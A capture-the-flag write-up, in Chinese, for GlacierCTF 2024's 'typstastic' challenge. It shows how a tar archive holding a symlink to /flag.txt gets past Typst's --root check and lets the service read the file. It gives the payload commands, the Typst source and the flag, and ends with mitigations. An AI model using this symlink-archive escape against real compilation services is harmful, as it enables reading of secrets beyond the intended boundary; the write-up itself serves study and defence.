# GlacierCTF 2024 typstastic

## 题目简述

服务接收包含 `main.typ` 的 tar.gz，在临时目录中执行：

```sh
typst compile --root "$DIR" main.typ
```

编译成功后返回包含 `main.pdf` 的 Base64 tar 包。Typst 的 `--root` 会阻止源码直接读取 `/flag.txt`，但服务解包时允许任意 tar 成员，Typst 0.11.0 的根目录检查又没有在解析符号链接后的真实路径上重新执行。上传指向 `/flag.txt` 的 symlink 即可越界读取。

## 解题过程

### 1. 验证直接绝对路径会失败

直接写：

```typst
#let text = read("/flag.txt")
#raw(text, lang: "plain")
```

Typst 会把读取范围限制在 `--root` 指定的临时目录，因而报告文件不在允许根目录中。这说明漏洞不只是一个被服务遗漏的绝对路径白名单。

### 2. 用 tar 带入逃逸 symlink

在本地准备两个成员：

```text
main.typ
file -> /flag.txt
```

`main.typ` 只通过相对路径读取：

```typst
#let text = read("file")
#raw(text, lang: "plain")
```

将二者一起打入 tar.gz。服务使用 `tar xz` 原样恢复 symlink；从词法路径看，`file` 位于 `$DIR` 内，因而通过 root 检查，但打开文件时内核跟随链接到 `/flag.txt`。官方 payload 中的链接可用下面的命令创建：

```sh
ln -s /flag.txt file
tar czf payload.tar.gz main.typ file
```

### 3. 从返回 PDF 提取文本

提交 `base64(payload.tar.gz)` 并以 `@` 结束。服务返回 Base64 编码、只包含 `main.pdf` 的 tar.gz；解包后查看 PDF 或执行 `pdftotext` 即可得到：

```text
gctf{4820_Th3_FutUr3_1s_n0w_0ld_TeX_Us3r_9238}
```

出题人的[完整说明](https://ecomaikgolf.com/posts/glacierctf2024-typstastic/)还演示了直接路径失败与 symlink 成功的差分；关键文件结构和 Typst 源码已在本文完整给出。

## 方法总结

本题是归档解包、符号链接和编译器文件根检查组合出的路径逃逸。只检查用户提供的词法路径不足以形成边界，必须在跟随链接后验证最终对象仍位于允许根目录；更可靠的服务还应拒绝 tar 中的 symlink/hardlink、使用安全解包器，并在不挂载秘密的独立文件系统里执行文档编译。
